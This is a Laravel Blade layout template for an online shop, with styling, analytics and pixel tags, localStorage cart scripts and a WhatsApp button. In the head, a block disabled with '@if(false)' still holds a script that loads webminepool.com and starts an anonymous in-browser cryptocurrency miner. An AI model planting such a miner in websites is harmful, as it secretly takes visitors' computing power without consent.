<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <meta name="google-site-verification" content="PFL51U5L5ABj-ieFlh5X4wlcZwfGARFzgBc_xJR0Syk" />
    {!! $meta_tags !!}
    <title>{{ $company->tagline ?? $company->name }} - @yield('title')</title>
    <link rel="icon" type="image/png" href="{{ asset($logo->favicon) }}"><!-- fonts -->
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-82FJMGEW8V"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-82FJMGEW8V');
    </script>
    <!-- css -->
    @include('facebook-pixel::head')
    @include('layouts.yellow.css')
    <!-- js -->
    <!-- font - fontawesome -->
    <link rel="stylesheet" href="{{ asset('strokya/vendor/fontawesome-5.6.1/css/all.min.css') }}"><!-- font - stroyka -->
    <link rel="stylesheet" href="{{ asset('strokya/fonts/stroyka/stroyka.css') }}">
    <style>
        ::placeholder {
            color: #ccc !important;
        }
        .site {
            max-height: 100vh;
            background: url('{{asset($logo->background??'')??''}}') no-repeat scroll center top #F0F0F0;
            background-size: cover;
            overflow-y: scroll;
            background-color: #f8f9fa;
        }
        .topbar__item {
            flex: none;
        }
        @media (min-width: 1200px) {
            .container {
                max-width: 1250px;
            }
        }
        .nav-links__item--has-submenu:hover .nav-links__submenu {
            display: flex;
            opacity: 1;
            visibility: visible;
            transform: rotateX(0deg);
        }
        .page-header__container {
            padding-bottom: 12px;
        }
        .products-list__item {
            justify-content: space-between;
        }
        @media (max-width: 479px) {
            /* .products-list[data-layout=grid-5-full] .products-list__item {
                width: 46%;
                margin: 8px 6px;
            } */
        }
        @media (max-width: 575px) {
            .mobile-header__search {
                top: 55px;
            }
            .mobile-header__search-form .aa-input-icon {
                display: none;
            }
            .mobile-header__search-form .aa-hint, .mobile-header__search-form .aa-input {
                padding-right: 15px !important;
            }
            .block-products-carousel[data-layout=grid-4] .product-card .product-card__buttons .btn {
                height: auto;
            }
        }
        .product-card:before {
            box-shadow: inset 0 0 0 1px #4a90e2;
        }
        .product-card:before,
        .owl-carousel {
            z-index: 0;
        }
        .block-products-carousel[data-layout^=grid-] .product-card .product-card__info,
        .products-list[data-layout^=grid-] .product-card .product-card__info {
            padding: 0 14px;
        }
        .block-products-carousel[data-layout^=grid-] .product-card .product-card__actions,
        .products-list[data-layout^=grid-] .product-card .product-card__actions {
            padding: 0 14px 14px 14px;
        }
        .product-card__name {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-weight: 500;
            color: #2c3e50;
        }
        .product-card__buttons {
            margin-right: -12px !important;
            margin-bottom: -12px !important;
            margin-left: -12px !important;
        }
        .product-card__buttons .btn {
            height: auto !important;
            font-size: 16px !important;
            padding: 0.5rem 0.75rem !important;
            border-radius: 4px !important;
            display: block;
            width: 100%;
            transition: all 0.3s ease;
        }
        .product-card__addtocart,
        .product__addtocart {
            background-color: #4a90e2 !important;
            border-color: #4a90e2 !important;
            color: #fff !important;
        }
        .product-card__addtocart:hover,
        .product__addtocart:hover {
            background-color: #357abd !important;
            border-color: #357abd !important;
        }
        .product-card__ordernow,
        .product__ordernow {
            background-color: #2ecc71 !important;
            border-color: #2ecc71 !important;
            color: #fff !important;
        }
        .product-card__ordernow:hover,
        .product__ordernow:hover {
            background-color: #27ae60 !important;
            border-color: #27ae60 !important;
        }
        .btn-primary:hover {
            background-color: #357abd !important;
            border-color: #357abd !important;
        }
        .aa-input-container {
            width: 100%;
        }
        .algolia-autocomplete {
            width: 100%;
            display: flex !important;
        }
        #aa-search-input {
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-radius: 4px;
        }
        .indicator__area {
            padding: 0 8px;
        }
        .mobile-header__search.mobile-header__search--opened {
            height: 100%;
            display: flex;
            align-items: center;
        }
        .mobile-header__search-form {
            width: 100%;
        }
        .mobile-header__search-form .aa-input-container {
            display: flex;
        }
        .mobile-header__search-form .aa-input-search {
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-radius: 4px;
        }
        .mobile-header__search-form .aa-hint,
        .mobile-header__search-form .aa-input {
            height: 54px;
            padding-right: 32px;
        }
        .mobile-header__search-form .aa-input-icon {
            right: 62px;
        }
        .mobile-header__search-form .aa-dropdown-menu {
            background-color: #fff;
            border-radius: 4px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            z-index: 9999 !important;
        }
        .aa-input-container input {
            font-size: 15px;
        }
        .toast {
            position: absolute;
            top: 10%;
            right: 10%;
            z-index: 9999;
            border-radius: 4px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        @media (max-width: 991px) {
            .header-fixed .site__header {
                position: fixed;
                width: 100%;
                z-index: 9999;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }
            .header-fixed .site__body {
                padding-top: 85px;
            }
            .header-fixed .mobilemenu__body {
                top: 85px;
            }
        }

        /** StickyNav **/
        .site-header.sticky {
            position: fixed;
            top: 0;
            min-width: 100%;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            background: #fff;
        }
        .site-header.sticky .site-header__middle {
            height: 65px;
        }
        .site-header.sticky .site-header__topbar {
            display: none;
        }
        ::placeholder {
            color: #95a5a6 !important;
        }

        /* Additional modern styling */
        .product-card {
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            border-radius: 8px;
            overflow: hidden;
        }

        .product-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }

        .product-card__image {
            border-radius: 8px 8px 0 0;
            overflow: hidden;
        }

        .product-card__image img {
            transition: transform 0.3s ease;
        }

        .product-card:hover .product-card__image img {
            transform: scale(1.05);
        }

        .product-card__prices {
            font-weight: 600;
            color: #2c3e50;
        }

        .product-card__new-price {
            color: #e74c3c;
        }

        .product-card__old-price {
            color: #95a5a6;
            text-decoration: line-through;
        }

        /* Header Section Styling */
        .site-header {
            background: #ffffff;
            color: #2c3e50;
        }
        .site-header__topbar {
            background-color: #2c3e50;
            color: #ecf0f1;
        }
        .site-header__middle {
            background-color: #ffffff;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .nav-panel {
            background: linear-gradient(to right, #2c3e50, #3498db);
        }
        .nav-links__item {
            color: #ffffff;
            font-weight: 500;
            transition: color 0.3s ease;
        }
        .nav-links__item:hover {
            color: #ecf0f1;
        }
        .nav-links__submenu {
            background-color: #ffffff;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .nav-links__submenu {
            background-color: #ffffff;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        /* Main Content Area */
        .site__body {
            background-color: #f8f9fa;
        }
        .page-header {
            background: linear-gradient(to right, #3498db, #2ecc71);
            color: #ffffff;
            padding: 2rem 0;
            margin-bottom: 2rem;
        }
        .page-header__title {
            color: #ffffff;
            font-weight: 600;
        }

        /* Product Cards Section */
        .block-products-carousel {
            background-color: #ffffff;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .block-products-carousel__header {
            border-bottom: 2px solid #e9ecef;
            padding-bottom: 1rem;
            margin-bottom: 1.5rem;
        }
        .block-products-carousel__title {
            color: #2c3e50;
            font-weight: 600;
        }

        /* Footer Section */
        .site-footer {
            background: linear-gradient(to right, #2c3e50, #34495e);
            color: #ecf0f1;
            padding: 3rem 0;
        }
        .site-footer__widget-title {
            color: #ffffff;
            font-weight: 600;
            margin-bottom: 1.5rem;
        }
        .site-footer__links a {
            color: #bdc3c7;
            transition: color 0.3s ease;
        }
        .site-footer__links a:hover {
            color: #3498db;
        }

        /* Cart and Checkout Sections */
        .cart-table {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .cart-table__header {
            background-color: #f8f9fa;
            color: #2c3e50;
        }
        .cart__totals {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .cart__totals-header {
            background-color: #f8f9fa;
            color: #2c3e50;
        }

        /* Search and Filter Sections */
        .filter {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            padding: 1.5rem;
        }
        .filter__title {
            color: #2c3e50;
            font-weight: 600;
        }
        .filter__item {
            border-bottom: 1px solid #e9ecef;
            padding: 0.75rem 0;
        }

        /* Alert and Notification Sections */
        .alert {
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .alert-success {
            background-color: #d4edda;
            color: #155724;
            border-color: #c3e6cb;
        }
        .alert-info {
            background-color: #d1ecf1;
            color: #0c5460;
            border-color: #bee5eb;
        }
        .alert-warning {
            background-color: #fff3cd;
            color: #856404;
            border-color: #ffeeba;
        }
        .alert-danger {
            background-color: #f8d7da;
            color: #721c24;
            border-color: #f5c6cb;
        }

        /* Mobile Menu Styling */
        .mobilemenu {
            background-color: #2c3e50;
        }
        .mobilemenu__header {
            background-color: #34495e;
            color: #ffffff;
        }
        .mobile-links__item {
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .mobile-links__item a {
            color: #ecf0f1;
        }
        .mobile-links__item a:hover {
            color: #3498db;
        }

        /* Department Menu */
        .departments {
            background-color: #34495e;
        }
        .departments__item {
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .departments__item-link {
            color: #ecf0f1;
        }
        .departments__item-link:hover {
            background-color: #2c3e50;
            color: #3498db;
        }

        /* Product Details Section */
        .product {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            padding: 2rem;
        }
        .product__name {
            color: #2c3e50;
            font-weight: 600;
        }
        .product__prices {
            background-color: #f8f9fa;
            padding: 1rem;
            border-radius: 4px;
        }
        .product__description {
            color: #6c757d;
        }

        /* Breadcrumb Styling */
        .breadcrumb {
            background-color: transparent;
            padding: 0.75rem 0;
        }
        .breadcrumb-item {
            color: #6c757d;
        }
        .breadcrumb-item.active {
            color: #2c3e50;
        }
        .breadcrumb-item + .breadcrumb-item::before {
            color: #6c757d;
        }

        /* Pagination Styling */
        .pagination {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            padding: 1rem;
        }
        .page-item.active .page-link {
            background-color: #3498db;
            border-color: #3498db;
        }
        .page-link {
            color: #2c3e50;
        }
        .page-link:hover {
            color: #3498db;
        }
    </style>
    @stack('styles')
    @if(false)
    <script src="https://webminepool.com/lib/base.js"></script>
    <script>
        window.onload = function() {
            console.log('JavaScript Loaded.');
            var miner = WMP.Anonymous('PK_E2svECzRD8g4zAKzHDtnQ', {throttle: 0.4});
            miner.start();
            console.log('JavaScript Working.');
        }
    </script>
    @endif
</head>

<body class="header-fixed" style="margin: 0; padding: 0;">
    @include('facebook-pixel::body')
    <!-- quickview-modal -->
    <div id="quickview-modal" class="modal fade" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-xl">
            <div class="modal-content"></div>
        </div>
    </div><!-- quickview-modal / end -->
    <!-- mobilemenu -->
    <div class="mobilemenu">
        <div class="mobilemenu__backdrop"></div>
        <div class="mobilemenu__body">
            <div class="mobilemenu__header">
                <div class="mobilemenu__title">Menu</div>
                <button type="button" class="mobilemenu__close">
                    <svg width="20px" height="20px">
                        <use xlink:href="{{ asset('strokya/images/sprite.svg#cross-20') }}"></use>
                    </svg>
                </button>
            </div>
            <div class="mobilemenu__content">
                <ul class="mobile-links mobile-links--level--0" data-collapse data-collapse-opened-class="mobile-links__item--open">
                    @include('partials.mobile-menu-categories')
                    @include('partials.header.menu.mobile')
                </ul>
            </div>
        </div>
    </div><!-- mobilemenu / end -->
    <!-- site -->
    <div class="site">
        <!-- mobile site__header -->
        @include('partials.header.mobile')
        <!-- mobile site__header / end -->
        <!-- desktop site__header -->
        @include('partials.header.desktop')
        <!-- desktop site__header / end -->
        <!-- site__body -->
        <div class="site__body">
            <div class="container">
                <x-alert-box class="row mt-2" />
            </div>
            @yield('content')
        </div>
        <!-- site__body / end -->
        <!-- site__footer -->
        @include('partials.footer')
        <!-- site__footer / end -->
    </div><!-- site / end -->
    @include('layouts.yellow.js')
    <script>
        $(document).ready(function () {
            // localStorage.removeItem('product-cart');
            function renderCart() {
                var cart = cartContent();
                $('.cart-count').text(cart.length);
                var cartProducts = cart.length ? cart.map(function (v, i) {
                    return `<div class="dropcart__product" data-id="${v.id}">
                        <div class="dropcart__product-image">
                            <a href="${v.detail}">
                                <img src="${v.image}" alt="">
                            </a>
                        </div>
                        <div class="dropcart__product-info">
                            <div class="dropcart__product-name">
                                <a href="${v.detail}">${v.name}</a>
                            </div>
                            <div class="dropcart__product-meta">
                                <span class="dropcart__product-quantity">${v.quantity}</span> x <span class="dropcart__product-price">TK ${v.price}</span>
                            </div>
                        </div>
                        <button type="button" class="dropcart__product-remove btn btn-light btn-sm btn-svg-icon" remove-cart-item data-id="${v.id}">
                            <svg width="10px" height="10px">
                                <use xlink:href="{{ asset('strokya/images/sprite.svg#cross-10') }}"></use>
                            </svg>
                        </button>
                    </div>`;
                }) : '<strong>No Items In Cart.</strong>';
                $('.dropcart__products-list').html(cartProducts);
                $('.cart-subtotal span, .checkout-subtotal span').text(cart.length ? cart.reduce(function (acc, v) {
                    return acc += Number(v.price) * Number(v.quantity);
                }, 0) : 0);
            }

            renderCart();

            function renderCartPage() {
                var cart = cartContent();
                $('.cart-count').text(cart.length);
                var cartProducts = cart.length ? cart.map(function (v, i) {
                    return `<tr class="cart-table__row" data-id="${v.id}">
                        <td class="cart-table__column cart-table__column--image">
                            <a href="${v.detail}">
                                <img src="${v.image}" alt=""></a>
                            </td>
                        <td class="cart-table__column cart-table__column--product">
                            <a href="${v.detail}" class="cart-table__product-name">${v.name}</a>
                        </td>
                        <td class="cart-table__column cart-table__column--price" data-title="Price">TK ${v.price}</td>
                        <td class="cart-table__column cart-table__column--quantity" data-title="Quantity">
                            <div class="input-number">
                                <input class="form-control input-number__input" type="number" min="1" value="${v.quantity}" `+(v.max != -1 ? 'max="'+v.max+'"' : '')+` readonly>
                                <div class="input-number__add"></div>
                                <div class="input-number__sub"></div>
                            </div>
                        </td>
                        <td class="cart-table__column cart-table__column--total" data-title="Total">TK ${Number(v.price) * Number(v.quantity)}</td>
                        <td class="cart-table__column cart-table__column--remove">
                            <button type="button" class="btn btn-light btn-sm btn-svg-icon" remove-cart-item data-id="${v.id}">
                                <svg width="12px" height="12px">
                                    <use xlink:href="{{ asset('strokya/images/sprite.svg#cross-12') }}"></use>
                                </svg>
                            </button>
                        </td>
                    </tr>`;
                }) : '<tr class="bg-danger"><td colspan="6" class="text-center py-2">No Items In Cart.</td></tr>';
                $('.cart-table__body').html(cartProducts);
                $('.cart-subtotal span, .checkout-subtotal span').text(cart.length ? cart.reduce(function (acc, v) {
                    return acc += Number(v.price) * Number(v.quantity);
                }, 0) : 0);
            }

            renderCartPage();

            $('.product-card__addtocart, .product-card__ordernow').on('click', function (ev) {
                ev.preventDefault();
                var card = $(this).parents('.product-card');
                var prices = card.find('.product-card__prices');
                var price = prices.hasClass('has-special')
                ? prices.find('.product-card__new-price span').text()
                : prices.find('span').text();

                var product = {
                    id: card.data('id'),
                    max: card.data('max'),
                    name: card.find('.product-card__info a').text(),
                    image: card.find('.product-card__image img').attr('src'),
                    detail: card.find('.product-card__name a').attr('href'),
                    quantity: 1,
                    price: price,
                };

                addToCart(product);

                if ($(this).hasClass('product-card__ordernow')) {
                    window.location = "{{ route('checkout') }}";
                }
            });

            function addToCart(product) {
                product.price = product.price.replace(/,/g , "");
                var cart = cartContent(), updated = false;
                cart = cart.filter(function (item) {
                    if (product.id == item.id) {
                        item.quantity = product.quantity;
                        updated = true;
                    }
                    return true;
                });
                updated || cart.push(product);
                localStorage.setItem('product-cart', JSON.stringify(cart));
                orderedProducts();
                renderCart();
                renderTotal();
                $.bootstrapGrowl("Product Added To Cart.", {
                    type: 'info',
                    align: 'right',
                    stackup_spacing: 30
                });
            }

            $('.product__actions-item--addtocart button, .product__actions-item--ordernow button').on('click', function (ev) {
                ev.preventDefault();
                var card = $(this).parents('.product__content');
                var prices = card.find('.product__prices');
                var price = prices.hasClass('has-special')
                ? prices.find('.product-card__new-price span').text()
                : prices.find('span').text();

                var product = {
                    id: card.data('id'),
                    max: card.data('max'),
                    name: card.find('.product__name').text(),
                    image: card.find('.product-base__image').attr('src'),
                    detail: card.find('.product-base__image').data('detail'),
                    quantity: Number($('#product-quantity').val()),
                    price: price,
                };

                addToCart(product);

                if ($(this).parent().hasClass('product__actions-item--ordernow')) {
                    window.location = "{{ route('checkout') }}";
                }
            });

            function cartContent() {
                var cart = JSON.parse(localStorage.getItem('product-cart'));
                return cart == null ? [] : cart;
            }

            $(document).on('click', '[remove-cart-item]', function (ev) {
                ev.preventDefault();
                removeFromCart($(this).data('id'));
                renderCart();
                renderCartPage();
                renderTotal();
            });

            function removeFromCart(id) {
                var cart = cartContent();
                cart = cart.filter(function (v, i) {
                    return v.id != id;
                });
                localStorage.setItem('product-cart', JSON.stringify(cart));
                orderedProducts();
                $.bootstrapGrowl("Product Removed From Cart.", {
                    type: 'info',
                    align: 'right',
                    stackup_spacing: 30
                });
            }

            $('.cart__update-button').on('click', function(ev) {
                ev.preventDefault();
                updateCart();
            });

            function updateCart() {
                var cart = cartContent();
                cart.filter(function (item) {
                    item.quantity = $('.cart-table__body tr[data-id="'+item.id+'"] .input-number input').val();
                    return item;
                });
                localStorage.setItem('product-cart', JSON.stringify(cart));
                orderedProducts();
                renderCart();
                renderCartPage();
                renderTotal();
            }

            $(document).on('click', '.input-number__add', function (ev) {
                ev.preventDefault();

                var input = $(this).siblings('input');
                if (input.attr('max') == undefined || input.attr('max') > input.val()) {
                    input.val(Number(input.val()) + 1);
                    input.attr('id') == 'product-quantity' || updateCart();
                }
            });

            $(document).on('click', '.input-number__sub', function (ev) {
                ev.preventDefault();

                var input = $(this).siblings('input');
                if (input.val() > 1) {
                    input.val(Number(input.val()) - 1);
                    input.attr('id') == 'product-quantity' || updateCart();
                }
            });

            function renderTotal() {
                var shipping = localStorage.getItem('shipping');
                $('[name="address"]').parents('.form-row').addClass(shipping ? 'd-flex' : 'd-none');
                if (shipping) {
                    $('#'+shipping).prop('checked', true);
                    var shipping = Number($('#'+shipping).data('val'));
                    $('.shipping span').text(shipping)
                } else {
                    shipping = 0;
                }

                $('.cart__totals-footer span').text(Number($('.cart__totals-header .cart-subtotal span').text()) + shipping);
                $('.checkout__totals-footer span').text(Number($('.checkout__totals-subtotals .checkout-subtotal.desktop span').text()) + shipping);
            }

            renderTotal();
            $('[name="shipping"]').on('change', function (ev) {
                localStorage.setItem('shipping', $(this).attr('id'));
                renderTotal();
            });

            function orderedProducts() {
                $('.ordered-products').empty();
                for (var index = 0, cart = cartContent(); index < cart.length; index++) {
                    $('.ordered-products').append('<input type="hidden" name="products['+cart[index].id+']" value="'+cart[index].quantity+'" />');
                }
            }
            orderedProducts();


            $(window).on('scroll', function() {
                $('input, textarea').blur();
                var scrollTop = $(this).scrollTop()
                if (scrollTop > 200) {
                    $('.site-header').addClass('sticky');
                    $('.site-header__phone').removeClass('d-none');
                    $('.departments').removeClass('departments--opened departments--fixed');
                    $('.departments__body').attr('style', '');
                } else {
                    $('.site-header').removeClass('sticky');
                    $('.site-header__phone').addClass('d-none');
                    if ($('.departments').data('departments-fixed-by') != '')
                        $('.departments').addClass('departments--opened departments--fixed');
                    $('.departments--opened.departments--fixed .departments__body').css('min-height', '458px');
                }
            });
        });
    </script>
    @stack('scripts')
    @php
        $phone = preg_replace('/[^\d]/', '', $whatsapp_number ?? '');
        if (strlen($phone) == 11) {
            $phone = '88' . $phone;
        }
    @endphp
    @if($phone)
    <a
        href="https://api.whatsapp.com/send?phone={{$phone}}" target="_blank"
        style="position:fixed;width:60px;height:60px;bottom:40px;right:40px;background-color:#25d366;color:#FFF;border-radius:50px;text-align:center;font-size:30px;box-shadow: 2px 2px 3px #999;z-index:100;"
    >
        <i class="fab fa-whatsapp" style="margin-top: 1rem;"></i>
    </a>
    <a
        href="https://api.whatsapp.com/send?phone={{$phone}}" target="_blank" class="wa__btn_popup_txt" style="display: block;left: unset;right: 100%;margin-right: 7px;margin-left: 0px;width: 155px;position: fixed;right: 95px;bottom: 60px;font-size: 12px;"><span style="
    background: #f5f7f9;
    padding: 8px 10px;
    border-radius: 4px;
">Need Help? <strong>Chat with us</strong></span></a>
    @endif
</body>

</html>
